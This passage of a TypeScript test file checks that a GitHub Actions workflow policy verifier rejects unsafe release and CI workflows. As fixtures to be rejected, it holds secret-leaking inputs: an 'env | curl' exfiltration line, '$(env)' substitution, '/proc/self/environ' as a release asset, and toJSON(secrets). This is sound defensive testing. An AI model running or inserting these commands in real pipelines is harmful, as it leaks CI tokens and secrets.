import { execFile } from "node:child_process";
import { existsSync } from "node:fs";
import { cp, mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { promisify } from "node:util";

import { describe, expect, it } from "vitest";

const execFileAsync = promisify(execFile);
const repositoryRoot = resolve(import.meta.dirname, "../../..");
const verifier = resolve(repositoryRoot, "scripts/verify-workflows.mjs");

const pins = {
  attest:
    "actions/attest-build-provenance@43d14bc2b83dec42d39ecae14e916627a18bb661",
  checkout: "actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5",
  codeql: "github/codeql-action/init@ddf5ce7296213f5548c91e2dd19df2d77d2b2d66",
  dependencyReview:
    "actions/dependency-review-action@a1d282b36b6f3519aa1f3fc636f609c47dddb294",
  downloadArtifact:
    "actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093",
  setupNode: "actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020",
  uploadArtifact:
    "actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02",
} as const;

const readRepositoryFile = (path: string): Promise<string> =>
  readFile(resolve(repositoryRoot, path), "utf8");

const workflowPaths = [
  ".github/workflows/ci.yml",
  ".github/workflows/package-smoke.yml",
  ".github/workflows/codeql.yml",
  ".github/workflows/release.yml",
] as const;

async function runVerifier(root = repositoryRoot) {
  return execFileAsync(process.execPath, [verifier, "--root", root], {
    cwd: repositoryRoot,
    encoding: "utf8",
  });
}

async function verifierFailure(root: string) {
  const failure: unknown = await runVerifier(root).then(
    () => undefined,
    (error: unknown) => error,
  );

  if (
    typeof failure !== "object" ||
    failure === null ||
    !("stderr" in failure) ||
    typeof failure.stderr !== "string"
  ) {
    throw new Error("Expected workflow verification to return stderr.");
  }

  expect("code" in failure ? failure.code : undefined).toBe(1);
  return failure.stderr;
}

const safeExtraWorkflow = `name: Extra

on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - run: echo safe
`;

const releasePolicySkeleton = `name: Release

on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  release:
    environment: release
    runs-on: ubuntu-latest
    steps:
      - run: echo verified
`;

const validBundleValidationCommand = `set -euo pipefail
cd release-bundle
[ -f github-stars-mcp.cdx.json ]
[ -f requirements.json ]
[ -f release-manifest.json ]
[ -f SHA256SUMS ]
[ "$(find . -mindepth 1 -maxdepth 1 -type f | wc -l)" -eq 5 ]
[ "$(find . -mindepth 1 -maxdepth 1 ! -type f | wc -l)" -eq 0 ]
set -- ./*.tgz
[ "$#" -eq 1 ]
[ -f "$1" ]
TARBALL="\${1#./}"
jq -e 'keys == ["commitSha", "gitRef", "name", "requirements", "sbom", "schemaVersion", "tarball", "version"]' release-manifest.json > /dev/null
[ "$(jq -er '.schemaVersion | select(. == 1)' release-manifest.json)" = "1" ]
NAME="$(jq -er '.name | select(type == "string" and length > 0)' release-manifest.json)"
VERSION="$(jq -er '.version | select(type == "string" and length > 0)' release-manifest.json)"
COMMIT_SHA="$(jq -er '.commitSha | select(type == "string" and length > 0)' release-manifest.json)"
GIT_REF="$(jq -er '.gitRef | select(type == "string" and length > 0)' release-manifest.json)"
MANIFEST_TARBALL="$(jq -er '.tarball | select(type == "string" and length > 0)' release-manifest.json)"
[ "$COMMIT_SHA" = "$GITHUB_SHA" ]
[ "$GIT_REF" = "$GITHUB_REF" ]
[ "$GIT_REF" = "refs/tags/v\${VERSION}" ]
[ "$MANIFEST_TARBALL" = "$TARBALL" ]
[ "$TARBALL" = "\${NAME}-\${VERSION}.tgz" ]
[ "$(jq -er '.sbom | select(type == "string")' release-manifest.json)" = "github-stars-mcp.cdx.json" ]
[ "$(jq -er '.requirements | select(type == "string")' release-manifest.json)" = "requirements.json" ]
EXPECTED_CHECKSUMS="$(printf '%s\\n' "$TARBALL" github-stars-mcp.cdx.json requirements.json release-manifest.json | LC_ALL=C sort)"
ACTUAL_CHECKSUMS="$(awk 'NF == 2 && $1 ~ /^[0-9a-f]{64}$/ { name=$2; sub(/^\\*/, "", name); print name }' SHA256SUMS | LC_ALL=C sort)"
[ "$(wc -l < SHA256SUMS)" -eq 4 ]
[ "$ACTUAL_CHECKSUMS" = "$EXPECTED_CHECKSUMS" ]
sha256sum --check --strict SHA256SUMS
`;

const validReleaseCommand = `set -euo pipefail
cd release-bundle
VERSION="$(jq -er '.version | select(type == "string" and length > 0)' release-manifest.json)"
TAG="v\${VERSION}"
EXPECTED_ASSETS="$(printf '%s\\n' "$TARBALL" github-stars-mcp.cdx.json requirements.json release-manifest.json SHA256SUMS | LC_ALL=C sort)"
if gh release view "$TAG" --repo "$GITHUB_REPOSITORY" >/dev/null 2>&1; then
  RELEASE_JSON="$(gh release view "$TAG" --repo "$GITHUB_REPOSITORY" --json assets,isDraft,isPrerelease)"
  while IFS= read -r ASSET; do
    case "$ASSET" in
      "$TARBALL"|github-stars-mcp.cdx.json|requirements.json|release-manifest.json|SHA256SUMS) ;;
      *) gh release delete-asset "$TAG" "$ASSET" --yes --repo "$GITHUB_REPOSITORY" ;;
    esac
  done < <(jq -r '.assets[].name' <<< "$RELEASE_JSON")
  gh release upload "$TAG" ./* --clobber --repo "$GITHUB_REPOSITORY"
else
  gh release create "$TAG" ./* --verify-tag --generate-notes --repo "$GITHUB_REPOSITORY"
fi
gh release edit "$TAG" --draft=false --prerelease=false --repo "$GITHUB_REPOSITORY"
FINAL_RELEASE="$(gh release view "$TAG" --repo "$GITHUB_REPOSITORY" --json assets,isDraft,isPrerelease)"
[ "$(jq -er '.isDraft' <<< "$FINAL_RELEASE")" = "false" ]
[ "$(jq -er '.isPrerelease' <<< "$FINAL_RELEASE")" = "false" ]
ACTUAL_ASSETS="$(jq -r '.assets[].name' <<< "$FINAL_RELEASE" | LC_ALL=C sort)"
[ "$ACTUAL_ASSETS" = "$EXPECTED_ASSETS" ]
`;

const validNpmPublishCommand = `set -euo pipefail
cd release-bundle
set -- ./*.tgz
[ "$#" -eq 1 ]
[ -f "$1" ]
case "$BOOTSTRAP_NPM" in
  true)
    [ -n "\${NPM_TOKEN:-}" ]
    export NODE_AUTH_TOKEN="$NPM_TOKEN"
    ;;
  false)
    unset NPM_TOKEN NODE_AUTH_TOKEN
    ;;
  *)
    exit 1
    ;;
esac
npm publish "$1" --provenance --access public
`;

const indentCommand = (command: string): string =>
  command
    .trimEnd()
    .split("\n")
    .map((line) => `          ${line}`)
    .join("\n");

const validFutureReleaseWorkflow = `name: Release

on:
  workflow_dispatch:
    inputs:
      publish_npm:
        description: Publish the verified tarball to npm after environment approval.
        required: true
        type: boolean
        default: false
      bootstrap_npm:
        description: Bootstrap the first npm publication with a short-lived token.
        required: true
        type: boolean
        default: false

concurrency:
  group: release-\${{ github.ref }}
  cancel-in-progress: false

permissions:
  contents: read

jobs:
  verify-package:
    runs-on: ubuntu-latest
    timeout-minutes: 45
    permissions:
      contents: read
    steps:
      - name: Check out source
        uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
        with:
          persist-credentials: false
      - name: Set up Node.js
        uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020
        with:
          node-version: 24
          cache: npm
      - run: npm install --global npm@11.12.1
      - run: test "$(npm --version)" = "11.12.1"
      - run: npm ci
      - run: npm run verify
      - run: npm run docs:check
      - run: npm run plugin:validate
      - run: npm run release:verify -- --release
      - run: npm run smoke:mcp
      - run: npm install --global @openai/codex@0.144.5
      - run: codex --version
      - run: npm run smoke:codex-plugin
      - run: node scripts/verify-release.mjs --bundle-release
      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
        with:
          name: release-bundle
          path: artifacts/release-bundle/
  release:
    needs: verify-package
    environment: release
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: write
      id-token: write
      attestations: write
    steps:
      - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093
        with:
          name: release-bundle
          path: release-bundle
      - name: Verify the immutable release bundle
        run: |
${indentCommand(validBundleValidationCommand)}
      - uses: actions/attest-build-provenance@43d14bc2b83dec42d39ecae14e916627a18bb661
        with:
          subject-path: release-bundle/*
      - name: Create or update the verified GitHub release
        env:
          GH_TOKEN: \${{ github.token }}
        run: |
${indentCommand(validReleaseCommand)}
  publish-npm:
    if: \${{ inputs.publish_npm }}
    needs: release
    environment: npm-publish
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093
        with:
          name: release-bundle
          path: release-bundle
      - name: Verify the immutable release bundle
        run: |
${indentCommand(validBundleValidationCommand)}
      - name: Set up Node.js
        uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020
        with:
          node-version: 24
          registry-url: https://registry.npmjs.org
      - run: |
          npm install --global npm@11.12.1
          test "$(npm --version)" = "11.12.1"
      - name: Publish the exact verified package
        env:
          BOOTSTRAP_NPM: \${{ inputs.bootstrap_npm }}
          NPM_TOKEN: \${{ secrets.NPM_TOKEN }}
        run: |
${indentCommand(validNpmPublishCommand)}
`;

async function withPolicyFixture<T>(
  callback: (fixtureRoot: string) => Promise<T>,
): Promise<T> {
  const fixtureRoot = await mkdtemp(join(tmpdir(), "workflow-policy-"));
  try {
    await cp(
      resolve(repositoryRoot, ".github"),
      resolve(fixtureRoot, ".github"),
      { recursive: true },
    );
    return await callback(fixtureRoot);
  } finally {
    await rm(fixtureRoot, { recursive: true, force: true });
  }
}

async function writeWorkflow(
  fixtureRoot: string,
  name: string,
  source: string,
): Promise<void> {
  await writeFile(
    resolve(fixtureRoot, ".github", "workflows", name),
    source,
    "utf8",
  );
}

function replaceJobDefinition(
  source: string,
  name: "verify-package" | "release" | "publish-npm",
  value: string,
): string {
  const pattern = new RegExp(`^  ${name}:\\n(?: {4,}.*\\n)*`, "mu");
  const replacement = value.startsWith("\n")
    ? `  ${name}:${value}\n`
    : `  ${name}: ${value}\n`;
  const result = source.replace(pattern, replacement);
  if (result === source) {
    throw new Error(`Expected ${name} job fixture to be replaced.`);
  }
  return result;
}

describe("GitHub workflow policy", () => {
  it("tests Node 22 and 24 without live mutation credentials", async () => {
    const ci = await readRepositoryFile(workflowPaths[0]);

    expect(ci).toMatch(/node-version:\s*\[22, 24\]/);
    expect(ci).toMatch(/GITHUB_STARS_MCP_READ_ONLY:\s*["']?true["']?/);
    expect(ci).not.toMatch(
      /GITHUB_STARS_TOKEN|^\s*(?:GITHUB_TOKEN|GH_TOKEN):/m,
    );
    expect(ci).toMatch(/permissions:\s*\n\s+contents:\s*read/);
    expect(ci).toContain(pins.checkout);
    expect(ci).toContain(pins.setupNode);
    expect(ci).toContain(pins.dependencyReview);
    expect(ci).toContain("npm ci");
    expect(ci).toContain("npm run verify:all");
  });

  it("runs the packed-install contract on three operating systems and two Node versions", async () => {
    const smoke = await readRepositoryFile(workflowPaths[1]);

    expect(smoke).toContain("ubuntu-latest");
    expect(smoke).toContain("macos-latest");
    expect(smoke).toContain("windows-latest");
    expect(smoke).toMatch(/node-version:\s*\[22, 24\]/);
    expect(smoke).toContain("npm ci");
    expect(smoke).toContain("npm run build");
    expect(smoke).toContain("npm run package:verify");
    expect(smoke).toContain("--help");
    expect(smoke).toContain("--version");
    expect(smoke).toContain("--doctor");
    expect(smoke).toMatch(/fixture-backed/i);
  });

  it("runs pinned CodeQL and dependency review with least privilege", async () => {
    const [ci, codeql] = await Promise.all([
      readRepositoryFile(workflowPaths[0]),
      readRepositoryFile(workflowPaths[2]),
    ]);

    expect(ci).toContain(pins.dependencyReview);
    expect(codeql).toContain(pins.codeql.replace("/init@", "/analyze@"));
    expect(codeql).toContain(pins.codeql);
    expect(codeql).toMatch(
      /permissions:\s*\n\s+contents:\s*read\s*\n\s+security-events:\s*write/,
    );
    expect(codeql).not.toMatch(/^\s*(?:GITHUB_TOKEN|GH_TOKEN):/m);
  });

  it("pins every external action to a lowercase 40-character commit SHA", async () => {
    const workflows = await Promise.all(
      workflowPaths.map((path) => readRepositoryFile(path)),
    );
    const references = workflows.flatMap((source) =>
      [...source.matchAll(/^\s*(?:-\s+)?uses:\s*([^\s#]+)/gm)].map(
        (match) => match[1]!,
      ),
    );

    expect(references.length).toBeGreaterThan(0);
    for (const reference of references) {
      expect(reference).toMatch(
        /^(?:\.\/|[A-Za-z0-9_.-]+\/[A-Za-z0-9_./-]+@[0-9a-f]{40})$/,
      );
    }
  });

  it("configures weekly npm and GitHub Actions updates with bounded pull requests", async () => {
    const dependabot = await readRepositoryFile(".github/dependabot.yml");

    expect(dependabot).toContain("package-ecosystem: npm");
    expect(dependabot).toContain("package-ecosystem: github-actions");
    expect(dependabot.match(/interval:\s*weekly/g)).toHaveLength(2);
    expect(dependabot.match(/open-pull-requests-limit:\s*10/g)).toHaveLength(2);
  });

  it("passes the YAML-AST workflow policy verifier", async () => {
    const result = await runVerifier();

    expect(result.stderr).toBe("");
    expect(result.stdout).toMatch(
      /^Workflow policy check passed: \d+ workflows and 2 dependency ecosystems\.\n$/,
    );
  });

  it("requires the manually gated release workflow", async () => {
    await withPolicyFixture(async (fixtureRoot) => {
      await rm(resolve(fixtureRoot, ".github/workflows/release.yml"), {
        force: true,
      });
      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain(".github/workflows/release.yml");
      expect(stderr).toContain("(WORKFLOW_MISSING)");
    });
  });

  it.each([
    {
      name: "a format wrapper around github.token",
      expression: "${{ format('{0}', github.token) }}",
    },
    {
      name: "toJSON of the complete secrets context",
      expression: "${{ toJSON(secrets) }}",
    },
    {
      name: "a bracketed secret",
      expression: "${{ secrets['DEPLOY_CREDENTIAL'] }}",
    },
    {
      name: "a dynamically indexed GitHub context",
      expression: "${{ github[format('{0}', 'token')] }}",
    },
    {
      name: "a numeric secrets index",
      expression: "${{ secrets[0] }}",
    },
    {
      name: "mixed-case bracket access",
      expression: "${{ SeCrEtS['DEPLOY_CREDENTIAL'] }}",
    },
    {
      name: "mixed-case GitHub token access",
      expression: "${{ GiThUb['ToKeN'] }}",
    },
    {
      name: "the complete GitHub context serialized as JSON",
      expression: "${{ toJSON(github) }}",
    },
    {
      name: "the bare complete GitHub context",
      expression: "${{ github }}",
    },
    {
      name: "a GitHub object filter serialized as JSON",
      expression: "${{ toJSON(github.*) }}",
    },
  ])("rejects $name in a non-release workflow", async ({ expression }) => {
    await withPolicyFixture(async (fixtureRoot) => {
      const target = resolve(fixtureRoot, workflowPaths[0]);
      const source = await readFile(target, "utf8");
      const marker = '  GITHUB_STARS_MCP_READ_ONLY: "true"';
      expect(source).toContain(marker);
      await writeFile(
        target,
        source.replace(
          marker,
          `${marker}\n  SAFE_VALUE: >-\n    ${expression}`,
        ),
        "utf8",
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(LIVE_TOKEN_REFERENCE)");
    });
  });

  it("rejects pull_request_target in every workflow", async () => {
    await withPolicyFixture(async (fixtureRoot) => {
      const target = resolve(fixtureRoot, workflowPaths[0]);
      const source = await readFile(target, "utf8");
      expect(source).toContain("  pull_request:\n");
      await writeFile(
        target,
        source.replace(
          "  pull_request:\n",
          "  pull_request:\n  pull_request_target:\n",
        ),
        "utf8",
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(PULL_REQUEST_TARGET_FORBIDDEN)");
    });
  });

  it.each(["nightly.yml", "release.yaml"])(
    "rejects unapproved workflow path %s",
    async (name) => {
      await withPolicyFixture(async (fixtureRoot) => {
        await writeWorkflow(
          fixtureRoot,
          name,
          name === "release.yaml" ? releasePolicySkeleton : safeExtraWorkflow,
        );

        const stderr = await verifierFailure(fixtureRoot);
        expect(stderr).toContain("(WORKFLOW_FORBIDDEN)");
      });
    },
  );

  it("rejects a release.yml disguised as an automatic release", async () => {
    await withPolicyFixture(async (fixtureRoot) => {
      await writeWorkflow(
        fixtureRoot,
        "release.yml",
        releasePolicySkeleton.replace(
          "  workflow_dispatch:\n",
          "  push:\n    branches: [main]\n",
        ),
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(RELEASE_TRIGGERS)");
    });
  });

  it.each([
    {
      name: "pull_request types",
      before: "  pull_request:\n",
      after: "  pull_request:\n    types: [opened]\n",
    },
    {
      name: "pull_request paths",
      before: "  pull_request:\n",
      after: "  pull_request:\n    paths: [src/**]\n",
    },
    {
      name: "pull_request paths-ignore",
      before: "  pull_request:\n",
      after: "  pull_request:\n    paths-ignore: [docs/**]\n",
    },
    {
      name: "pull_request branches",
      before: "  pull_request:\n",
      after: "  pull_request:\n    branches: [main]\n",
    },
    {
      name: "pull_request branches-ignore",
      before: "  pull_request:\n",
      after: "  pull_request:\n    branches-ignore: [legacy]\n",
    },
    {
      name: "push paths",
      before: "    branches: [main]\n",
      after: "    branches: [main]\n    paths: [src/**]\n",
    },
    {
      name: "push paths-ignore",
      before: "    branches: [main]\n",
      after: "    branches: [main]\n    paths-ignore: [docs/**]\n",
    },
    {
      name: "push branches-ignore",
      before: "    branches: [main]\n",
      after: "    branches: [main]\n    branches-ignore: [legacy]\n",
    },
    {
      name: "push types",
      before: "    branches: [main]\n",
      after: "    branches: [main]\n    types: [created]\n",
    },
  ])("rejects CI trigger narrowing through $name", async (fixture) => {
    await withPolicyFixture(async (fixtureRoot) => {
      const path = resolve(fixtureRoot, ".github/workflows/ci.yml");
      const source = await readFile(path, "utf8");
      expect(source).toContain(fixture.before);
      await writeFile(
        path,
        source.replace(fixture.before, fixture.after),
        "utf8",
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(CI_TRIGGERS)");
    });
  });

  it.each([
    {
      name: "a missing description",
      before:
        "        description: Publish the verified tarball to npm after environment approval.\n",
      after: "",
    },
    {
      name: "required set false",
      before: "        required: true\n",
      after: "        required: false\n",
    },
    {
      name: "required quoted as text",
      before: "        required: true\n",
      after: '        required: "true"\n',
    },
    {
      name: "a string type",
      before: "        type: boolean\n",
      after: "        type: string\n",
    },
    {
      name: "a true default",
      before: "        default: false\n",
      after: "        default: true\n",
    },
    {
      name: "a default quoted as text",
      before: "        default: false\n",
      after: '        default: "false"\n',
    },
    {
      name: "an extra input property",
      before: "        default: false\n",
      after: "        default: false\n        options: [false, true]\n",
    },
  ])("rejects publish_npm with $name", async (fixture) => {
    await withPolicyFixture(async (fixtureRoot) => {
      expect(validFutureReleaseWorkflow).toContain(fixture.before);
      await writeWorkflow(
        fixtureRoot,
        "release.yml",
        validFutureReleaseWorkflow.replace(fixture.before, fixture.after),
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(RELEASE_INPUT)");
    });
  });

  it.each([
    {
      name: "a missing bootstrap_npm input",
      before: `      bootstrap_npm:
        description: Bootstrap the first npm publication with a short-lived token.
        required: true
        type: boolean
        default: false
`,
      after: "",
      code: "RELEASE_INPUT",
    },
    {
      name: "bootstrap_npm enabled by default",
      before: `      bootstrap_npm:
        description: Bootstrap the first npm publication with a short-lived token.
        required: true
        type: boolean
        default: false`,
      after: `      bootstrap_npm:
        description: Bootstrap the first npm publication with a short-lived token.
        required: true
        type: boolean
        default: true`,
      code: "RELEASE_INPUT",
    },
    {
      name: "a ref-independent concurrency group",
      before: "  group: release-${{ github.ref }}",
      after: "  group: release",
      code: "RELEASE_CONCURRENCY",
    },
    {
      name: "concurrency cancellation",
      before: "  cancel-in-progress: false",
      after: "  cancel-in-progress: true",
      code: "RELEASE_CONCURRENCY",
    },
    {
      name: "quoted concurrency cancellation",
      before: "  cancel-in-progress: false",
      after: '  cancel-in-progress: "false"',
      code: "RELEASE_CONCURRENCY",
    },
    {
      name: "workflow-wide write permission",
      before: "permissions:\n  contents: read",
      after: "permissions:\n  contents: write",
      code: "RELEASE_PERMISSIONS",
    },
  ])(
    "rejects release control-plane mutation through $name",
    async (fixture) => {
      await withPolicyFixture(async (fixtureRoot) => {
        expect(validFutureReleaseWorkflow).toContain(fixture.before);
        await writeWorkflow(
          fixtureRoot,
          "release.yml",
          validFutureReleaseWorkflow.replace(fixture.before, fixture.after),
        );

        const stderr = await verifierFailure(fixtureRoot);
        expect(stderr).toContain(`(${fixture.code})`);
      });
    },
  );

  it.each([
    {
      name: "an unpinned attestation action",
      before: pins.attest,
      after: "actions/attest-build-provenance@v3",
      code: "UNPINNED_ACTION",
    },
    {
      name: "an unpinned upload action",
      before: pins.uploadArtifact,
      after: "actions/upload-artifact@v4",
      code: "UNPINNED_ACTION",
    },
    {
      name: "an unpinned download action",
      before: pins.downloadArtifact,
      after: "actions/download-artifact@v4",
      code: "UNPINNED_ACTION",
    },
    {
      name: "a floating Codex version",
      before: "npm install --global @openai/codex@0.144.5",
      after: "npm install --global @openai/codex@latest",
      code: "RELEASE_EXECUTION_POLICY",
    },
    {
      name: "a floating npm version",
      before: "npm install --global npm@11.12.1",
      after: "npm install --global npm@latest",
      code: "RELEASE_EXECUTION_POLICY",
    },
    {
      name: "release verification outside release mode",
      before: "npm run release:verify -- --release",
      after: "npm run release:verify",
      code: "RELEASE_EXECUTION_POLICY",
    },
    {
      name: "a bundle command outside bundle mode",
      before: "node scripts/verify-release.mjs --bundle-release",
      after: "node scripts/verify-release.mjs --prepare-only",
      code: "RELEASE_EXECUTION_POLICY",
    },
    {
      name: "an upload path broader than the exact bundle",
      before: "          path: artifacts/release-bundle/",
      after: "          path: artifacts/",
      code: "RELEASE_EXECUTION_POLICY",
    },
    {
      name: "a release job checkout",
      before: `    steps:
      - uses: ${pins.downloadArtifact}`,
      after: `    steps:
      - uses: ${pins.checkout}
      - uses: ${pins.downloadArtifact}`,
      code: "RELEASE_EXECUTION_POLICY",
    },
    {
      name: "a missing system checksum verification",
      before: "sha256sum --check --strict SHA256SUMS",
      after: "true # checksum bypassed",
      code: "RELEASE_EXECUTION_POLICY",
    },
    {
      name: "a missing commit SHA binding",
      before: '[ "$COMMIT_SHA" = "$GITHUB_SHA" ]',
      after: "true # commit binding bypassed",
      code: "RELEASE_EXECUTION_POLICY",
    },
    {
      name: "a missing ref binding",
      before: '[ "$GIT_REF" = "$GITHUB_REF" ]',
      after: "true # ref binding bypassed",
      code: "RELEASE_EXECUTION_POLICY",
    },
    {
      name: "a missing tag/version binding",
      before: '[ "$GIT_REF" = "refs/tags/v${VERSION}" ]',
      after: "true # tag binding bypassed",
      code: "RELEASE_EXECUTION_POLICY",
    },
    {
      name: "a missing manifest/tarball binding",
      before: '[ "$MANIFEST_TARBALL" = "$TARBALL" ]',
      after: "true # tarball binding bypassed",
      code: "RELEASE_EXECUTION_POLICY",
    },
    {
      name: "a narrower attestation subject",
      before: "          subject-path: release-bundle/*",
      after: "          subject-path: release-bundle/*.tgz",
      code: "RELEASE_EXECUTION_POLICY",
    },
    {
      name: "a non-idempotent GitHub release",
      before:
        'if gh release view "$TAG" --repo "$GITHUB_REPOSITORY" >/dev/null 2>&1; then',
      after: "if false; then",
      code: "RELEASE_EXECUTION_POLICY",
    },
    {
      name: "a fresh npm repack during publication",
      before: 'npm publish "$1" --provenance --access public',
      after: "npm publish --provenance --access public",
      code: "RELEASE_EXECUTION_POLICY",
    },
    {
      name: "npm publication without provenance",
      before: 'npm publish "$1" --provenance --access public',
      after: 'npm publish "$1" --access public',
      code: "RELEASE_EXECUTION_POLICY",
    },
    {
      name: "bootstrap mode without a non-empty token assertion",
      before: '    [ -n "${NPM_TOKEN:-}" ]',
      after: "    true # token assertion bypassed",
      code: "RELEASE_EXECUTION_POLICY",
    },
    {
      name: "OIDC mode that retains the npm token",
      before: "    unset NPM_TOKEN NODE_AUTH_TOKEN",
      after: "    true # token retained",
      code: "RELEASE_EXECUTION_POLICY",
    },
  ])("rejects release pipeline mutation through $name", async (fixture) => {
    await withPolicyFixture(async (fixtureRoot) => {
      expect(validFutureReleaseWorkflow).toContain(fixture.before);
      await writeWorkflow(
        fixtureRoot,
        "release.yml",
        validFutureReleaseWorkflow.replace(fixture.before, fixture.after),
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain(`(${fixture.code})`);
    });
  });

  it("aborts the release shell guard when multiple tarballs exist", async () => {
    const root = await mkdtemp(join(tmpdir(), "release-shell-guard-"));
    const windowsBash = resolve(
      process.env.ProgramFiles ?? "C:/Program Files",
      "Git/bin/bash.exe",
    );
    const bash =
      process.platform === "win32" && existsSync(windowsBash)
        ? windowsBash
        : "bash";
    try {
      await mkdir(resolve(root, "artifacts"));
      await Promise.all([
        writeFile(resolve(root, "artifacts/one.tgz"), "one", "utf8"),
        writeFile(resolve(root, "artifacts/two.tgz"), "two", "utf8"),
      ]);
      const script = `set -e
set -- artifacts/*.tgz
[ "$#" -eq 1 ]
[ -f "$1" ]
touch guard-bypassed
`;

      await expect(
        execFileAsync(bash, ["-c", script], {
          cwd: root,
          encoding: "utf8",
          windowsHide: true,
        }),
      ).rejects.toMatchObject({ code: 1 });
      await expect(
        readFile(resolve(root, "guard-bypassed"), "utf8"),
      ).rejects.toMatchObject({ code: "ENOENT" });
    } finally {
      await rm(root, { force: true, recursive: true });
    }
  });

  it("rejects release jobs without their protected environment", async () => {
    await withPolicyFixture(async (fixtureRoot) => {
      await writeWorkflow(
        fixtureRoot,
        "release.yml",
        releasePolicySkeleton.replace("    environment: release\n", ""),
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(RELEASE_ENVIRONMENT)");
    });
  });

  it("rejects release jobs with permissions broader than the exact minimum", async () => {
    await withPolicyFixture(async (fixtureRoot) => {
      await writeWorkflow(
        fixtureRoot,
        "release.yml",
        releasePolicySkeleton.replace(
          "    runs-on: ubuntu-latest\n",
          `    runs-on: ubuntu-latest
    permissions:
      contents: write
      id-token: write
      attestations: write
      packages: read
`,
        ),
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(RELEASE_PERMISSIONS)");
    });
  });

  it("rejects jobs outside the three release-stage allowlist", async () => {
    await withPolicyFixture(async (fixtureRoot) => {
      await writeWorkflow(
        fixtureRoot,
        "release.yml",
        `${releasePolicySkeleton}
  exfiltrate:
    environment: release
    runs-on: ubuntu-latest
    steps:
      - run: echo unsafe
`,
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(RELEASE_JOBS)");
    });
  });

  it.each([
    ["verify-package", "null", "null"],
    ["verify-package", "a scalar", "invalid"],
    ["verify-package", "a sequence", "\n    - invalid"],
    ["release", "null", "null"],
    ["release", "a scalar", "invalid"],
    ["release", "a sequence", "\n    - invalid"],
    ["publish-npm", "null", "null"],
    ["publish-npm", "a scalar", "invalid"],
    ["publish-npm", "a sequence", "\n    - invalid"],
  ] as const)(
    "rejects the %s job when it is %s",
    async (jobName, _shape, value) => {
      await withPolicyFixture(async (fixtureRoot) => {
        await writeWorkflow(
          fixtureRoot,
          "release.yml",
          replaceJobDefinition(validFutureReleaseWorkflow, jobName, value),
        );

        const stderr = await verifierFailure(fixtureRoot);
        expect(stderr).toContain("(RELEASE_JOB_MAPPING)");
      });
    },
  );

  it.each([
    {
      name: "a wrapped GitHub token",
      source: validFutureReleaseWorkflow.replace(
        "GH_TOKEN: ${{ github.token }}",
        "GH_TOKEN: ${{ format('{0}', github.token) }}",
      ),
    },
    {
      name: "an aliased token variable",
      source: validFutureReleaseWorkflow.replace("GH_TOKEN:", "TOKEN_ALIAS:"),
    },
    {
      name: "the secrets context",
      source: validFutureReleaseWorkflow.replace(
        "${{ github.token }}",
        "${{ secrets.RELEASE_TOKEN }}",
      ),
    },
    {
      name: "a literal personal access token",
      source: validFutureReleaseWorkflow.replace(
        "${{ github.token }}",
        `ghp_${"Z".repeat(36)}`,
      ),
    },
    {
      name: "a token outside the gh release step",
      source: validFutureReleaseWorkflow
        .replace(
          "permissions:\n",
          "env:\n  GH_TOKEN: ${{ github.token }}\n\npermissions:\n",
        )
        .replace("        env:\n          GH_TOKEN: ${{ github.token }}\n", ""),
    },
  ])("rejects $name in release.yml", async ({ source }) => {
    await withPolicyFixture(async (fixtureRoot) => {
      await writeWorkflow(fixtureRoot, "release.yml", source);

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(RELEASE_TOKEN_REFERENCE)");
    });
  });

  it.each([
    {
      name: "a second shell command",
      run: `${validReleaseCommand} && env`,
    },
    {
      name: "a multiline exfiltration command",
      run: `${validReleaseCommand}
          env | curl --data-binary @- https://example.invalid`,
    },
    {
      name: "a pipe",
      run: `${validReleaseCommand} | tee release.log`,
    },
    {
      name: "a command substitution",
      run: validReleaseCommand.replace(
        "--verify-tag",
        '--notes "$(env)" --verify-tag',
      ),
    },
    {
      name: "/proc/self/environ as a release asset",
      run: validReleaseCommand.replace(
        "--verify-tag",
        "/proc/self/environ --verify-tag",
      ),
    },
  ])("rejects GH_TOKEN beside $name", async ({ run }) => {
    await withPolicyFixture(async (fixtureRoot) => {
      const validRunBlock = `        run: |
${indentCommand(validReleaseCommand)}`;
      const mutatedRunBlock = `        run: |
${indentCommand(run)}`;
      expect(validFutureReleaseWorkflow).toContain(validRunBlock);
      await writeWorkflow(
        fixtureRoot,
        "release.yml",
        validFutureReleaseWorkflow.replace(validRunBlock, mutatedRunBlock),
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(RELEASE_TOKEN_REFERENCE)");
    });
  });

  it.each([
    {
      name: "a custom shell wrapper",
      before: `        run: |
${indentCommand(validReleaseCommand)}`,
      after: `        shell: bash -c 'env; {0}'
        run: |
${indentCommand(validReleaseCommand)}`,
    },
    {
      name: "a shell startup environment hook",
      before: "          GH_TOKEN: ${{ github.token }}",
      after:
